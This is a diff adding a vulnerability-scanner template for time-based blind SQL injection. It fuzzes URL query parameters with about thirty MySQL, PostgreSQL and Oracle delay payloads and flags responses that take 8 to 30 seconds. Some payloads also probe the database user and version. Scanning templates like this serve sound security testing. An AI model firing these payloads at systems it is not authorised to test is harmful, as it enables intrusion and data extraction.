@@ -1,0 +1,60 @@
+id: time-based-sqli
+info:
+  name: Time-Based Blind SQL Injection
+  author: github.com/freelancermijan
+  severity: Critical
+  description: Detects time-based blind SQL injection vulnerability
+  tags: sqli,bsqli,dast
+  
+http:
+  - method: GET
+    path:
+        - "{{BaseURL}}" 
+    payloads:
+      injection:
+      - "1' or sleep(10)#"
+      - "' AND if(now()=sysdate(),SLEEP(15),0)-- wXyW"
+      - "if(now()=sysdate(),SLEEP(15),0)"
+      - "'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      - "'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
+      - "'XOR(if((select now()=sysdate()),sleep(15),0))XOR'Z"
+      - "X'XOR(if(now()=sysdate(),//sleep(15)//,0))XOR'X"
+      - "X'XOR(if(now()=sysdate(),(sleep((((15))))),0))XOR'X"
+      - "X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X"
+      - "'XOR(SELECT(0)FROM(SELECT(SLEEP(15)))a)XOR'Z"
+      - "(SELECT(0)FROM(SELECT(SLEEP(15)))a)"
+      - "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'"
+      - "'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'"
+      - "(SELECT * FROM (SELECT(SLEEP(15)))a)"
+      - "'%2b(select*from(select(sleep(15)))a)%2b'"
+      - "CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END"
+      - "');(SELECT 4564 FROM PG_SLEEP(10))--"
+      - "['')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23']"
+      - "DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar"
+      - "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND'bar'='bar"
+      - "1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK"
+      - "(select*from(select(sleep(10)))a)"
+      - "'%2b(select*from(select(sleep(9)))a)%2b'"
+      - "*'XOR(if(2=2,sleep(10),0))OR'"
+      - "-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//"
+      - "'+(select*from(select(if(1=1,sleep(20),false)))a)+'"
+      - "2021 AND (SELECT 6868 FROM (SELECT(SLEEP(10)))IiOE)"
+      - "BENCHMARK(10000000,MD5(CHAR(116)))"
+      - "'%2bbenchmark(10000000%2csha1(1))%2b'"
+      - "'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20 - true"
+      - "if(now()=sysdate(),sleep(9),0)/'XOR(if(now()=sysdate(),sleep(9),0))OR'XOR(if(now()=sysdate(),sleep(9),0))OR"
+      - "if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"
+      - "XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+            - "{{injection}}"
+    stop-at-first-match: true
+    matchers:
+     - type: dsl
+       dsl:
+       - "status_code == 200"
+       - "duration>=8 && duration <=30"
+       condition: and
